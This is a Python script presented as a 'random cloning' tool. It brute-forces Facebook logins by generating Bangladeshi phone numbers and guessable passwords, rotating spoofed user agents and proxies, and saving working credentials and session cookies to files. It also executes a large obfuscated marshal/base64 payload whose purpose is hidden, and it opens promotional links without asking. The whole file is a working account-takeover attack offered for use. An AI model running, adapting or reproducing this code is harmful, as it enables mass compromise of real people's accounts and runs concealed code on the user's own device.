
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pkg install espeak')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/U7P4L-IN')

logo = ("""
\033[1;94m       [+]===============================================[+]
\033[1;94m       [+]        CREATED BY   :  PRINCE RONI               \033[1;94m[+]
\033[1;94m       [+]        ON GITHUB    :  TR-RONI               \033[1;94m[+]
\033[1;94m       [+]        TEAM         :  ANONYMOUS CYBER        \033[1;94m[+]
\033[1;94m       [+]        TOOL VERSION :  1.0                    \033[1;94m[+]
\033[1;94m       [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m[+]
\033[1;94m       [+]        COUNTRY      :  BANGLADESH             \033[1;94m[+]
\033[1;94m       [+]===============================================[+]
""")                                              

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'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'))
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)        
        print(" [01] RANDOM  NUMBER CLONE \033[1;34m")
        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m")
        print(" [00] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://facebook.com/groups/1184701498826324/')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://facebook.com/utpalcyber')
        if Alif in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
   
    limit = int(input(' [?] Crack Your Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as noob:
        os.system('clear')
        print(logo)     
        tl = str(len(user))
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[+] Wait for ids ')
        print(' \033[1;97m[+] Use flight mode for speed up ')
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            noob.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mN3OB_𝙷4𝙲𝙺𝙴𝚁\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
           'method':'POST',
           'scheme':'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5633.201", "Google Chrome";v="113.0.5633.201"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '""',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5633.201 Mobile Safari/537.36',
           'viewport-width': '980',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[U7P4L-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[U7P4L-CP🔪] {uid}|{ps}")
                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[U7P4L🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()